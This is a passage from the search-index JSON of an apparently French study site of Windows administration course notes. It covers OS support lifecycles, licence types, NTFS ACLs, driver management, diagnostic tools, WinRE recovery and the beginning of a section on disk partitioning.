g\u00e9n\u00e9ral d'une dur\u00e9e de 5 ans, cela permet aux entreprises d'avoir du temps pour organiser la migration vers le nouvel OS. Le support \u00e9tendu continue durant les 5 ans \u00e0 proposer des correctifs et des KB de s\u00e9curit\u00e9. En effet il est tres rare de developper des KB d'am\u00e9liorations ou de nouvelles fonctionnalit\u00e9.</p> <p>A la fin du support \u00e9tendu, l'OS n'est plus support\u00e9 ce qui signifie qu'il ne beneficiera plus de nouvelle mise a jour, moins de mise a jour = moins de s\u00e9curit\u00e9 et moins de fiabilit\u00e9!</p> <p>Une mise a jour est defini par une KB (knowledge base) une maj peut contenir l'amelioration d'une fonctionnalit\u00e9, peut corriger une erreur ou peut boucher une faille de s\u00e9curit\u00e9, il est donc important de faire des mise a jour.  </p> <p>MicroSoft a mis a disposition des services pack afin de gagner du temps sur les mise a jour en cas d'installation plusieurs ann\u00e9e apres la sortie de l'OS.</p>"},{"location":"Windows/OS_Windows/#waas-windows-as-a-service","title":"&gt;WaaS (Windows As A Service)","text":"<ul> <li>Windows Insider = Communaut\u00e9 d'utilisateur de beta testeurs</li> <li>Build = version de l'OS, chaque build est identifi\u00e9 par un num\u00e9ro servant a retrouver sa date de sortie (ex1903 pour mars 2019), chaque build offrant son lots de nouveaut\u00e9, le support d'une build est de 18 mois</li> <li>Feature update (mise a jour de fonctionnalit\u00e9) = mise a disposition officiel d'une build aux entreprises et au grand publics, il y a 2 Features Update /an</li> <li>Quality updates (mise a jour de qualit\u00e9) = Propos\u00e9 a des rythme plus soutenu, elle comporte des maj de s\u00e9curit\u00e9 et de corrective, elles sont cumulatives et mise a dispo chaque 2eme mardi du mois (patch tuesday)</li> </ul> <p>Durant 6 mois la communaut\u00e9 Windows Insider et MicroSoft travail main dans la main. Durant cette periode microsoft recupere, massivement et tres regulierement, des rapport d'utilitisation et d'incident. Microsoft exploite toutes ces donn\u00e9es recolt\u00e9 pour creer et deployer des correctif, des mise a jour de s\u00e9curit\u00e9 et des nouvelles fonctionnalit\u00e9es.</p> <p>Au bout des 6 mois, de recolte de donn\u00e9es, une build peut etre mise en production (ex: 1903), MicroSoft la deploye via une Feature update.</p> <p>Ensuite la build connaitra une quality update afin de se renforcer et de ce fiabiliser, mais ne connaitra pas de nouvelle fonctionnalit\u00e9. Pendant ce temps les Insiders et MicroSoft travail deja sur la prochaine build, 6 mois apres une feature update sera disponible avec son lot de nouvelle fonctionnalit\u00e9 (ex:1909). L'utilisateur a le choix de mettre a jour son OS ou de continuer avec la build qu'il possede.</p> <p>6 mois passe une nouvelle build est mise en production, l'utilisateur a toujours la possibilit\u00e9 de migrer vers l'ancienne build (ex 1909) ou d'installer la nouvelle (ex:2004).</p> <p>6 mois plus tard une build suivante arrive (ex:2009) la 1903 arrive en fin de support car elle aura v\u00e9cu 18 mois, l'utilisateur doit imp\u00e9rativement migrer vers une build en phase de support.</p>"},{"location":"Windows/OS_Windows/#editon-licence","title":"Editon &amp; Licence","text":"<ol> <li>edition famille usage domestique exclusivement : edition de base, comporte les fonctionalit\u00e9 de base native : moteur de recherche vocal cortana, les fonctionalit\u00e9 bureau supp, timeline, onedrive etc</li> <li>edition pro: construite sur la base famille, meme fonctionnalit\u00e9 avec en plus utilitaire specifique pour le monde l'entreprise : chiffrement bitlocker et EFS (encrypted Files System), la possibilit\u00e9 de joindre a l'AD (Active directory)</li> <li>edition entreprise: surcouche de l'edition pro, embarque des fonctionnalit\u00e9 pour les grands groupes comme direct acces (permet la connex. distante et auto d'un utilisateur au reseau de son entreprise)</li> <li>Edition plus specifique comme l'edition education, professionel pour station de travail, l'edition entreprise ltsc (long terme servicing channel) version entreprise avec support assur\u00e9 pdt 10 ans</li> </ol> <p>Pour avoir le droit d'exploiter Windows et beneficier des mise a jours il faut posseder une licence.</p> <p>Les regles d'utilisation de Windows sont inscrit dasn le CLUF (Contrat de Licence d'Utilisateur Final) EULA (End User Licence Agreements).</p> <p>Il existe different type de licence :</p> <ul> <li>OEM (Original Equipment Manufacturer): Pr\u00e9install\u00e9e, li\u00e9e a la machine et li\u00e9e au bios (impossible de l'installer sur une autre machine)</li> <li>Retail (Vente au d\u00e9tail): li\u00e9 a l'utilisateur, s'installe sur un poste mais peut-etre install\u00e9 sur un futur ordinateur.</li> <li>MAK : Multiple activation key (pour les petites entreprises): licence comportant un nombre d'activation pr\u00e9-programm\u00e9</li> <li>VLK : Volume licence key (meme principe que la MAK): destin\u00e9es au plus grosse entreprise (pour les parcs de machine de plus de 25 postes), necessite KMS   (centralise l'activation des machines)</li> <li>CAL : Client Access Licence: licence permettant au client de solliciter le service d'un serveur microsoft.</li> <li>CAL Applicative: permet, apres installation d'un soft sur poste de travail, de ce connecter au service non natif install\u00e9 sur le serveur   ex: Exchange sur le serveur et outlook sur le poste de travail (le P.t soit disposer d'une CAL applicative)</li> </ul> <p>Explication 32 et 64 bits</p> <p>Le 64 bits est une architecture mat\u00e9riel, plus on avance dans le temps plus le mat\u00e9riel evolue (plus petit plus puissant). Les \u00e9l\u00e9ments de l'ordinateur via la carte mere peuvent echanger entre eux avec plus de fiabilit\u00e9 et de vitesse, le systeme doit s'adapter a ce modele d'architecture vu que cest lui qui l'exploite, il existe donc des OS et des soft pour les architectures 32 &amp; 64 bits. Les architecture 64bits sont maintenant tres r\u00e9pandu sur le march\u00e9 mais pour assurer une retrocompabitilit\u00e9 microsoft continue de proposer du 32 bits pour les anciennes g\u00e9n\u00e9ration. Le 64bits amene plus de performance, OS win10 prend nativement en compte plus de 4Go de Memoire vive, meilleur protection du systeme via l'UEFI(evolution du bios) au dm\u00e9rrrage, meilleur chiffrement via les puce TPM souvent embarqu\u00e9 dasn les PC portable, fiabilit\u00e9 car il ne gere que les periph dont le drivers est sign\u00e9 et approuv\u00e9 par microsoft (r\u00e9duit les risque de bluescreen), les 64bits ne porennent plus en charge les periph dev. en 16bits.</p>"},{"location":"Windows/OS_Windows/#linstallation","title":"L'installation","text":"<ul> <li>Nouvelle installation   installation sur nouveau mat\u00e9riel ou en remplacement d'un systeme existant (le disque de donn\u00e9e sera donc format\u00e9, faire des backup)</li> <li>Mise a niveau</li> <li>Par dessus un windows existant (cela n'est pas le mieux car cela fait chuter le taux de fiabilit\u00e9 du systeme)</li> <li>Impossible de faire une mise a niveau si l'OS est 2 generation en dessous</li> <li>Utile pour la conservation de donn\u00e9es difficilement exportable ou pour l'utilisation de soft ou le .exe n'est plus disponible</li> </ul>"},{"location":"Windows/OS_Windows/#migration","title":"Migration","text":"<p>L'installation de Windows sous entend que l'utilisateur possede un nouvelle ordinateur (renouvellement de parc ou nouvelle machine). Cela signifie qu'il doit r\u00e9cuperer un environnement de travail similaire a celui qu'il avait avant (pour ne pas perdre en productivit\u00e9, en temps d'adaptation et de formation). C'est \u00e0 l'\u00e9quipe technique de ce charger du transfert et de la migration des donn\u00e9es.</p> <p>Il faudra reflechir aux \u00e9lements \u00e0 transferer de l'ancien vers le nouveau poste :</p> <ul> <li>Les comptes et profil des utilisateurs</li> <li>Les configurations particuli\u00e8res des logiciel install\u00e9 localement</li> <li>Outils bureautique</li> <li>Parametre systeme, tel que pilote, messagerie, police d'ecriture</li> <li>Fichiers et dossiers</li> <li>l'equipe pourra s'appuyer sur la solution centralis\u00e9 de back-up</li> <li>sinon MS propose sa solution native de back-up de donn\u00e9es \"outils de sauvegarde et restauration\"</li> </ul> <p>Pour le reste il sera tout a fait possible de migrer la liste situ\u00e9 au dessus via des scripts USMT (User State Migration Tools) proc\u00e9dure d'utilisation des USMT sont dispo sur le site MS</p>"},{"location":"Windows/OS_Windows/#interargir-avec-windows","title":"Interargir avec Windows","text":"<p>OS multi-utilisateur Chaques utilisateurs possede un profil dans lequel son bureau est personnalisable ainsi que son menu demarrer. Ils peuvent ajouter des bureaux suppl\u00e9mentaire afin d'agrandir leurs espace de travail, il \u00e9galement de la Timeline (depuis la build 1803) qui propose un historique des t\u00e2ches.</p> <p>OS multitache Cela offre la possibilit\u00e9 d'utiliser plusieurs applications en meme temps et de basculer de l'une a l'autre depuis la barre des taches (ou via Win+tab). Le gestionnaire des taches permet d'afficher le d\u00e9tail du bon fonctionnement des applications.</p> <p>Zone de notification Apporte des info en temps r\u00e9el et des raccourcis vers certains programme Programmes tournant en arri\u00e8re plan. Les notifications syst\u00e8mes apparaisent dans cette zone. On peut \u00e9galement acceder au parametres syst\u00e8me depuis cette zone.</p> <p>L'\u00e9lement int\u00e9ressant, de cette zone est de pouvoir observer l'etat de la connexion r\u00e9seau et de pouvoir la configurer.  </p> <p>Zone de recherche Tres pratique pour acceder \u00e0 n'importe quelle emplacement du syst\u00e8me. Gr\u00e2ce \u00e0 l'indexation elle propose des suggestions automatique pour gagner du temps</p> <p>Example</p> <p>Taper dans la barre de recherche = panneau le systeme proposera directement panneau de configuration</p> <p>Consoles mmc (pour Microsoft Management Console) Principales outil du technicien. Console pr\u00e9configur\u00e9 disponible via <code>WIN+R</code> puis en tapant <code>mmc</code> Cela lancera une console vierge \u00e0 configurer avec vos propre logiciel enfichable egalement disponible grace au fichier <code>mmc.exe</code> disponible dans le dossier <code>c:\\windows system32</code></p>"},{"location":"Windows/Client/ACL/","title":"D\u00e9couvrir les ACL","text":""},{"location":"Windows/Client/ACL/#ntfs-les-acl","title":"NTFS &amp; les ACL","text":"<p>[inserer image issu support de cours] l'onglet s\u00e9curit\u00e9 : Accessible via les propri\u00e9t\u00e9 d'un objet (dossier, doc...) herberg\u00e9 sur le volume D:\\</p> <ul> <li>DACL (liste de controle d'acces discr\u00e9tionnaire) filtre :</li> <li>les utilisateurs</li> <li>les groupes<ul> <li>locaux (creer au pr\u00e9alable)</li> <li>pr\u00e9definis (ex: administrateur)</li> </ul> </li> <li> <p>entit\u00e9 de s\u00e9curit\u00e9 int\u00e9gr\u00e9 (ex ici systemes)</p> </li> <li> <p>ne contient pas d'utilisateur, c'est une bonne pratique a appliqu\u00e9 sur le terrain, on evite au max. d'int\u00e9gr\u00e9 des util. dans les DACL (plus facile et productif de gerer 10 groupes que 100 utilisateurs)</p> </li> <li> <p>ACE (Access Control Entry): definissent les actions possible sur l'objet pour le groupe en question.</p> </li> <li>Ecriture</li> <li>lecture</li> <li>modification</li> </ul> <p>(ex: sur l'image le groupe voisin peut lire/executer le contenu du dossier, le modifier)</p> <p>pour les besoins courant et dans la majorit\u00e9 des cas les ACE de base sont utilis\u00e9es et cumulatives. elles sont configurable depuis le bouton modifiable de l'onglet s\u00e9curit\u00e9.</p> <p>Les niveaux d'acces ACE</p> <ol> <li>Lecture : avec ce niveau l'utilisateur pourra lire des fichiers, exe des programmes et afficher le contenu d'un dossier</li> <li>Modification : niveau lecture toujours pr\u00e9sent mais il pourra modifier les fichiers, creer et supprimer des objets dans ce repertoire</li> <li>Contr\u00f4le total: meme droit que les niveau 1 &amp; 2 mais la possibilit\u00e9 de gerer soit meme les ACL de l'objet en question.</li> </ol> <p>Il est conseill\u00e9 d'utiliser au max. ces 3 nivx d'acces !</p> <p>Dans certain cas des authorisations sp\u00e9cial peuvent etre configur\u00e9s (disponible depuis l'onglet avance de l'onglet securit\u00e9), permet d'affiner les acces. (ex: creation de fichiers, supp de sous-dossier, creer un fichier sans pouvoir l'imprimer etc).</p>"},{"location":"Windows/Client/ACL/#definir-les-acl-acces-control-list","title":"d\u00e9finir les ACL (Acces Control List)","text":"<p>sur un volume en NTFS (New Technology File system) :</p> <ul> <li>tous les r\u00e9pertoires et tous les fichiers sont soumis a la securit\u00e9 NTFS</li> <li>des autorisations d\u00e9finissent des privileges d'acces (les droits d'acces a ces objets)</li> <li>l'utilisateur presente son jeton d'acces, qui est filtr\u00e9 par la ressource, donnant l'acces ou bloquant l'acces</li> <li>les authorisat\u00b0 sont stock\u00e9es dans l'index du systemes de fichier NTFS</li> <li>elles sont consultables et modifiable dasn l'onglet s\u00e9curit\u00e9 de chaque objet.</li> </ul>"},{"location":"Windows/Client/ACL/#les-permission-les-regles","title":"les permission les regles","text":"<p>Elles sont bas\u00e9e sur des regles explicite ils faut explicitement des groupes dans les DACL et des acces dans les ACE 1 groupe absent de la DACL sera refuser = refus implicite chaque regle peut accorder des privileges (autoriser) ou les oter (refuser) Plusieurs regles d'acces peuvent s'appliquer a un meme utilisateur     la regle la plus permissive l'emporte (plus haut niveau d'acces l'emporte) le refus explicite l'emporte sur l'authorisation     ex: un groupe me donne l'acces en lecture et un autre qui refuse explicitement la lecture</p>"},{"location":"Windows/Client/ACL/#mecanisme-dheritage","title":"Mecanisme d'h\u00e9ritage","text":"<p>Par d\u00e9faut, un r\u00e9pertoire propage ses autorisations a ses objets enfants les autorisations h\u00e9rit\u00e9es apparaissent gris\u00e9es et ne sont pas modifiable (ces le mecanisme d'heritage) une autorisation d'acces l'emporte sur un refus explicite h\u00e9rit\u00e9</p> <p>Pour les modifier, il faut : Modifier les autorisations sur le dossier parent (voir remonter jusqu'a la racine du lecteur) si les modif du dossier parent on un impact sur d'autre dossier enfant il faudra (pour transformer les autorisation <code>gris\u00e9es</code> en autorisation <code>noire</code> et modifiable): \"casser\" l'heritage (a effectuer avec precaution)     Gestion de l'heritage depuis le menu avanc\u00e9</p> <p>l'heritge NTFS fait partit int\u00e9grante de la secu NTFS, la copie et le d\u00e9placement de fichier ou d'arborescence on un impact sur les autorisations d'acces. elles sont conserv\u00e9 si on coupe/colle, on deplace un objet au sein d'un meme volume car il s'agit du meme index de systeme de fichier qui est solicit\u00e9 par contre si on deplace vers un autre volume (ou si on copie un fichier vers un autre systeme de fichier) l'objet sera consid\u00e9r\u00e9 comme de nx objets et ce sont les autorisation d'acces herit\u00e9 qui l'emporte.</p>"},{"location":"Windows/Client/ACL/#verif-des-acl","title":"verif des ACL","text":"<p>une fois les ACL configur\u00e9 il faut :</p> <ul> <li>Testez les acces avec les utilisateurs !</li> <li>si possible dirrectement avec eux (appel pour verif en temps r\u00e9el) cela permet a l'equipe tech d'echanger avec les utilisateurs !</li> <li>ou/et verifiez les acc\u00e8s depuis l'onglet acces effectif du menu avanc\u00e9 ! toujours test les acces avant d'annonce que des partages sont en production !</li> </ul> <p>Resumer:</p> <p>ACL a manipuler avec pr\u00e9caution !</p> <p>Bonnes pratiques pour eviter les effets de bord et les mauvaises surprises :</p> <ul> <li>Privil\u00e9gier au max. l'insertion des groupes dans les DACL</li> <li>Utiliser au maximum ACE de base (lecture/modification/controle total/refus)</li> <li>Garder en tete les m\u00e9canismes d'h\u00e9ritage (attention aux copies, aux d\u00e9placements)</li> <li>Privil\u00e9gier l'utilisation des droits heriter (h\u00e9ritage)</li> <li>Privil\u00e9gier le refus implicite (plutot que de cocher des cases refus)</li> <li>Toujours tester/verifier les actions sur les ACL.</li> <li>! Attention a l'UAC pour les administrateurs, il peut avoir un effet non voulu suite a des manipulations avec les ACL, en effet UAC (User Account Control) fait en sorte que meme en \u00e9tant membre du gorupe admin. le systeme le considere avant tous comme un utilisateur, et ceux pour des questions de s\u00e9curit\u00e9, il est possible de desactiver ce comportement via les strat\u00e9gie de s\u00e9curit\u00e9 !  </li> <li></li> </ul>"},{"location":"Windows/Client/Definir_un_Pilote/","title":"D\u00e9finition d'un pilotes (Drivers)","text":"<p>Prise en charge d'un p\u00e9riph\u00e9rique par l'OS</p> <ul> <li>Prise en charge \u00e0 chaud = Plug &amp; play via USb ou connectique sans fils</li> <li>n\u00e9cessite un red\u00e9marrage (plus rare) = non Plug &amp; Play (p\u00e9riph\u00e9rique interne connect\u00e9 a un port Pci par ex)</li> </ul> <p>Mode de prise en charge :</p> <ul> <li>detection automatique Utilisation directement apres le branchement</li> <li>detection manuel = recherche et installation manuel</li> </ul> <p>Affichage et param\u00e9trage: Ils seront ensuite param\u00e9trable via l'outil Gestionnaire de p\u00e9riph\u00e9rique (ou win+R &gt; Devmgmt.msc)</p>"},{"location":"Windows/Client/Definir_un_Pilote/#gestionnaire-de-peripherique","title":"Gestionnaire de p\u00e9riph\u00e9rique","text":"<p>La console affiche les p\u00e9riph pris en charge et non pris en charge, possibilit\u00e9 de metre a jour les pilotes, desactiver, desinstaller ou editer les propri\u00e9tes de l'appareil.</p> <p>Via le menu des propri\u00e9t\u00e9s possibilit\u00e9 de verifier sa version, restaurer une version plus ancienne du pilote ou afficher le detail des informations.</p> <p>information int\u00e9ressante dans les d\u00e9tails du p\u00e9riph ! son n\u00b0 d'identification</p> <ul> <li>Compos\u00e9 d'un Id de fabricant <code>VEN_ Vendor Id</code></li> <li>Id du mat\u00e9riel chez ce fabricant <code>DEV_ DEVice ID</code></li> <li>Semblable \u00e0 un N\u00b0 de s\u00e9rie ou une Adresse MAC. A l'aide de ses Id (<code>VEN_</code>&amp;<code>DEV_</code>)il y a la possibilit\u00e9 de retrouver, sur internet (pcilookup.com), le pilote d'un p\u00e9riph non pris en charge.  </li> </ul>"},{"location":"Windows/Client/Definir_un_Pilote/#windows-et-les-pilotes","title":"Windows et les pilotes","text":"<p>il s'agit d'un manuel d'utilisation pour l'OS, via les pilotes (drivers) windows utilise le p\u00e9riph dasn les meilleurs conditions selon l'architecture de la machine il existe des pilotes en 32 &amp; 64 bits.</p> <p>les pilotes sign\u00e9s sont privil\u00e9gi\u00e9s par MicroSoft, les signatures des pilotes sont symbolis\u00e9 par un certif de conformit\u00e9 fourni avec le pilote, qui permettent de garantir la stabilit\u00e9 du systeme</p> <p>depuis la mise en place des pilotes sign\u00e9s ont r\u00e9duit l'apparition des Blue Screen. celui-ci etait due majoritairement a des pilotes mal construit ou a des produits defaillant</p>"},{"location":"Windows/Client/Definir_un_Pilote/#fichiers-dun-pilotes","title":"fichiers d'un pilotes","text":"<p>les drivers sont d\u00e9finis par un ensemble ded fichiers :</p> <ul> <li>*.inf : d\u00e9finition du pilote au format texte</li> <li>*.sys : pilote compil\u00e9 et directement utilisable par le systeme</li> <li>*.cat : signature du pilote</li> <li>.exe,.dll,*.xml...: fichiers compl\u00e9mentaire selon les besoins</li> </ul> <p>la prise en charge du p\u00e9riph peut ce faire directement depuis le *.inf</p> <ul> <li>directement sur le fichier (clic droit installer)</li> <li>a partir d'un assistant d'installation (setup.exe) et de gestion tiers du p\u00e9riph (ex: mise a jour)</li> </ul> <p>Une fois install\u00e9, le pilote est m\u00e9moris\u00e9 par le systeme:     - prise en charge auto a l'allumage ou au branchement du p\u00e9riph     - cela permet sa r\u00e9installation automatique       - chaque pilote install\u00e9 manuellement genere un fichier oemXX.inf     - Tous les fichiers *.inf, de tous les p\u00e9riph sont disponible dans c:\\windows\\INF     - tous les autres fichiers sont disponible dans</p> <pre><code>      - c:\\windows\\system32\n        - *.sys c:\\windows\\system32\\drivers\n        - c:\\windows\\sysWOW64 (system windows 32bits on Windows 64bits)\n</code></pre>"},{"location":"Windows/Client/Definir_un_Pilote/#magasin-de-pilotes-windows","title":"Magasin de pilotes Windows","text":"<p>Ensemble de pilotes dispo des l'installation du systeme</p> <ul> <li>appell\u00e9 egalement pilotes generique</li> <li>nb de pilotes pr\u00e9-install\u00e9 varie selon les version de windows et le nb de maj windows update effectu\u00e9. pratique ce magasin permet au system de trouver automatiquement qui vous permet de faire fonctionner un p\u00e9riph sans avoir besoin d'installer le pilote du fabricant. (int\u00e9ressant quand un pilote est introuvable sur internet)</li> </ul> <p>cela peut etre limitant parfois car le systeme ne peut pas utiliser toutes les fonct du periph, mais uniquemetn les foncti de base. pour avoir toutes les fonctio il faudra obligatoirement passer par le pilote contructeur/fabricant.</p> <p>Ce magasin stock tous les pilotes dans le dossier c:\\windows\\system32\\driverstore gestion du magasin en ligne de commande via <code>pnputil</code></p> <p>En compl\u00e9ment:</p> <p>la commande <code>msinfo32</code> permet d'afficher une fenetre graphique comportant des informations detaill\u00e9 sur</p> <ul> <li>le materiel</li> <li>les periph</li> <li>le systeme</li> </ul> <p>la commande <code>driverquery</code>: outil cmd pour lister les pilotes install\u00e9s     - <code>driverquery /SI</code> pour lister les pilotes sign\u00e9s</p> <p>la commande <code>pnputil</code>: gestion du magasin de pilotes windows (ajout,suppresion, information)     - <code>pnputil /enum-drivers</code> pour lister les pilotes tiers (oemXX.inf)     - <code>pnputil /add-driver pilote.inf</code> pour ajouter un pilote au magasin</p>"},{"location":"Windows/Client/Outils_diagnostic/","title":"Les probl\u00e9matiques","text":""},{"location":"Windows/Client/Outils_diagnostic/#performances-est-ce-que-le-systeme-est-en-mesure-de-realiser-les-taches","title":"Performances : Est-ce que le systeme est en mesure de r\u00e9aliser les taches ?","text":"<p>Ils peuvent etre caus\u00e9s par de mauvaise performances du systemes d'exploitation et du mat\u00e9riel. Niveau mat\u00e9riel il faudra surveiller les 4 elements majeur de l'ordinateur:</p> <ol> <li>Processeur</li> <li>Memoire vive</li> <li>Stockage</li> <li>Carte r\u00e9seau</li> </ol>"},{"location":"Windows/Client/Outils_diagnostic/#fiabilite-est-ce-que-le-systeme-a-le-comportement-attendu","title":"Fiabilit\u00e9: Est-ce que le systeme a le comportement attendu ?","text":"<p>est-ce que l'ordinateur de l'utilisateur peut correctement faire son travail quotidien? est ce que l'ordinateur demarre vite et sans probleme? Est-ce que tous les services dont j'ai besoin sont demarr\u00e9s ? est-ce que toutes mes applications professionnel demarre et fonctionne correctement ?</p>"},{"location":"Windows/Client/Outils_diagnostic/#les-methodes-disponibles-pour-repondre-a-ces-questions","title":"Les methodes disponibles pour r\u00e9pondre a ces questions","text":"<ol> <li>Analyse en temps r\u00e9el : afin de voir un probleme en cours</li> <li>Analyse sur un historique : afin de voir un (ou des) dysfonctionnement survenu dernierement</li> <li>Diagnostic automatique : inclus nativement dans windows                             &gt;En general non utilis\u00e9 par les equipes techniques car les process et les resultats ne sont pas assez transparent (voir inexistant)</li> </ol> <p>Analyse en temps reel : Comment Proceder ?</p> <p>Afin de visualiser ce qui ce passe sur mon systeme actuellement ,windows propose plusieurs outils, plusieurs tableaux de bord :</p> <ul> <li>le gestionnaires de t\u00e2ches: permet de lister:</li> <li>les processus en cours d'execution,</li> <li>l'etat des services,</li> <li>les taux d'utilisation du mat\u00e9riel (performance processeur et memoire)</li> <li>Observateur d'\u00e9v\u00e8nements : appel\u00e9 egalement journaux d'evenement ou log permet de trouver des indices sur les dysfonctionnement</li> <li>Moniteur de ressources : Tableau de bord compl\u00e9mentaire au Gestionnaire de taches, il donne des d\u00e9tails sur l'utilisation actuel des 4 composants principaux</li> <li>Analyseur de performances : Permet de positionner des sondes (compteurs), de declencher des sondes sur un choix de plusieurs centaines d'elements du systeme.</li> </ul> <p>Tres utilis\u00e9 sur des serveurs et en derniers recours si les autres outils d'analyse sont pas aid\u00e9s</p> <p>Analyse sur un historique :</p> <ul> <li>Historique de fiabilit\u00e9 : propose une vue synthetique, resum\u00e9 de l'etat de sant\u00e9 de windows. Il recense les evenements majeur du systeme dans le temps</li> <li>Observateur d'evenements: A disposition pour remonter le temps et enqueter sur la cause d'un dysfonctionnement pass\u00e9 ou qui se repete regulierement (les evenements sont m\u00e9moris\u00e9s dans des journaux de 20Mo par d\u00e9faut)</li> <li>Analyseur de Performances : permet de planifier des compteurs (sondes), dans des plages horaires (heure de nuit, bureau ferm\u00e9 etc.), afin de recuperer un rapport d'analyse generer par l'outil</li> </ul> <p>Diagnostic automatique :</p> <p>Utiliser pour des analyses pouss\u00e9e du mat\u00e9riel.</p> <ul> <li>diagnostic de m\u00e9moire Windows : redemarre automatiquement le systeme et lance une serie de tests sur la m\u00e9moire physique</li> <li>Composant R\u00e9solution de probleme: s\u00e9rie de packs de r\u00e9solution de probleme int\u00e9gr\u00e9s \u00e0 Windows.     &gt;Ils sont orient\u00e9s utilisateur, il n'est pas possible de choisir ou consulter la solution trouv\u00e9e</li> </ul>"},{"location":"Windows/Client/Outils_diagnostic/#dans-quel-but","title":"Dans quel but ?","text":"<p>Les outils d'analyse sont a disposition pour trouver des indices, pour comprendre et faire des recherches. En compl\u00e9ment il sera, quasiment, obligatoire d'utiliser d'autre ressources:</p> <ul> <li>Recherches sur internet : il existe bien souvent une solution au probleme.</li> <li>Le site technet est le site officiel des techniciens microsoft, est tres riche en procedure et en r\u00e9solution de probleme.</li> <li>Aide Windows,</li> <li>Forum.</li> </ul>"},{"location":"Windows/Client/Outils_diagnostic/#point-de-restauration-systeme","title":"Point de restauration syst\u00e8me","text":"<p>Les Point de restauration systeme agissent comme un journal, ils enregistrent les modifications du systeme.</p> <ul> <li>Le systeme peut etre restaurer \u00e0 un \u00e9tat ant\u00e9rieur, et cela plus rapidement qu'une restauration compl\u00e8te via les enregistrements</li> <li>Sauvegarde la base de registre, certains fichiers systeme et les programmes</li> <li>! ne sauvegarde pas la DATA ! pour cela l'utilisation d'un logiciel de sauvegarde avant une restauration est n\u00e9cessaire.</li> <li>L'outils est d\u00e9sactiv\u00e9 par d\u00e9faut</li> <li>Doit etre activ\u00e9 Volume par Volume</li> </ul> <p>Apres activation de la fonctionnalit\u00e9, les points de restauration sont cr\u00e9e :</p> <ul> <li>Chaque jour</li> <li>A chaque evenement important survenant sur le systeme</li> <li>Installation d'un pilote</li> <li>D\u00e9sinstallation d'un logiciel</li> <li>...</li> <li>Manuellement</li> </ul> <p>L'outils est disponible via les propri\u00e9t\u00e9s avanc\u00e9 du systeme et dans l'onglet Protection du systeme (ou via sysdm.pl) Un espace prot\u00e9g\u00e9s est allou\u00e9 pour le stockage des points de restauration (methode FIFO), il est possible d'en determiner la taille. Si celui-ci est totalement occup\u00e9 alors le points de restauration le plus r\u00e9cent ecrasera le plus ancien.</p> <p>La restauration peut etre effectu\u00e9 via l'onglet nomm\u00e9 au dessus ou, si le systeme est entierement plant\u00e9, via WinRE</p>"},{"location":"Windows/Client/Outils_diagnostic/#recuperer-le-systeme","title":"R\u00e9cuperer le systeme","text":""},{"location":"Windows/Client/Outils_diagnostic/#winre","title":"WinRE","text":"<p>il s'agit de l'outil officiel et natif de r\u00e9cup\u00e9ration de l'OS principal de la machine. WinRE est un systeme d'exploit leger qui permet de reparer le sys d'exploit principale lorsque celui ne repond plus. Il embarque des outils de diagnostic et de r\u00e9paration, il offre \u00e9galement la possibilit\u00e9 de revenir a une config d'usine</p>"},{"location":"Windows/Client/Outils_diagnostic/#comment-lancer-winre","title":"Comment lancer WinRE ?","text":"<p>En premier lieu WinRE est un syst d'exploit secondaire, il doit etre disp sur un support bootable. C'est le cas du DD principal de l'ordinateur, un volume est reserv\u00e9, sur le DD, pour cet OS de secours.</p> <p>Pour le lancer :</p> <ul> <li>via le menu demarrer il suffit de cliquer sur redemar tout en maintenant la touche <code>shift</code> (MAJ)</li> <li>via la ligne de commande <code>shutdown /r /o</code> (/r = reboot | /O = winRE | /T= temps avant red\u00e9marrage (ex /t 0 = red\u00e9marrage imm\u00e9diat))</li> <li>via le menu Parametre&gt;Mise a jour de s\u00e9curit\u00e9&gt;R\u00e9cup\u00e9ration&gt;Red\u00e9marrer maintenant</li> <li>via le support d'installation, dans le cas au le DD principal connait un probleme et ne peut lancer WinRE, il faudra ce rendre dans le menu R\u00e9parer l'ordinateur</li> </ul> <p>Lancement automatique de WinRE si il considere que le systeme principal n'est pas assez fiable:</p> <ul> <li>Apres 2 echecs cons\u00e9cutifs du d\u00e9marrage du systeme d'exploitation</li> <li>Apres 2 arrets impr\u00e9vus survenus moins de 2 min apr\u00e8s le d\u00e9marrage.</li> </ul>"},{"location":"Windows/Client/Outils_diagnostic/#recuperation-du-systeme","title":"R\u00e9cup\u00e9ration du systeme","text":"<ul> <li>WinRE propose de restaurer le systeme via un point de restauration systeme disponible, pour cela il faut etre administrateur,</li> <li>sauvegarde de l'image systeme Il sera possible de restaurer entierement le systeme.</li> <li>Invite de commande <code>cmd</code>execut\u00e9e en tant qu'administrateur, permet d'utiliser des outils de diagnostic ou de r\u00e9paration</li> </ul> <p>Si Windows provient d'une Man (Mise A Niveau) possibilit\u00e9 de retrograder vers la version pr\u00e9c\u00e9dente.</p>"},{"location":"Windows/Client/Outils_diagnostic/#windows-ne-veut-pas-demarrer","title":"Windows ne veut pas demarrer ?","text":"<p>Cela est certainement due a un probleme dans la sequence de demarrage pour cela nous pouvons lancer une s\u00e9quence de demarrage differente:</p> <ul> <li>Mode sans echec : Windows 10 leger et qui ne demarre que les elements indispensables</li> <li>Mode basse r\u00e9solution : Dans le cas ou la carte graphique fait d\u00e9faut et que rien ne s'affiche a l'ecran</li> <li>Sans prise en compte de la signatures des pilotes : Dans le cas ou un peripherique ne fonctionne pas faute de certificat</li> </ul> <p>Outils de red\u00e9marrage syteme :</p> <p>permet en autre de :</p> <ul> <li>reconstruire/r\u00e9parer le MBR ou la GUID PArtition Table \u00e9ventuellemnt manquant ou corrompu</li> <li>Reconstruire/r\u00e9parer le magasin BCD (Boot Configuration Data) cela correspond a un ensemble de fichier qui prennent en charge et coordonne le d\u00e9marrage habituel de Windows</li> </ul>"},{"location":"Windows/Client/Stockage/","title":"La gestion du stockage","text":"<p>explication des notions suivante:</p> <ul> <li>Partitionnement</li> <li>Format de table de partition</li> <li>systeme de fichiers</li> <li>Outils</li> </ul>"},{"location":"Windows/Client/Stockage/#le-partitionnement","title":"Le partitionnement","text":"<p>dans le domaine du stockage le partitionnement signifie separer un disque en plusieurs portion logiques, \u00e9tanches et independantes les une des autres [inserer schema] Le disque dur possede une table de paritionnement, elle agit comme un sommaire de DD. Il y a 2 types de table de partition:</p> <ul> <li>Format MBR (Master Boot Record) :</li> <li>format historique,</li> <li>indispensable pour le bios, dans les dernieres etapes de demarrage le bios a pour mission de charger l'OS en m\u00e9moire vive, l'OS est un ensemble de fichier pr\u00e9sent sur le disque dur (dans une partition), le MBR indique au bios ou ce situe la partition dasn laquel les fichiers de l'OS sont sotck\u00e9.</li> <li>Le MBR est stock\u00e9 sur le premier secteur du DD (secteur 0) taille de 512octets = ananlogie du sommaire avec un 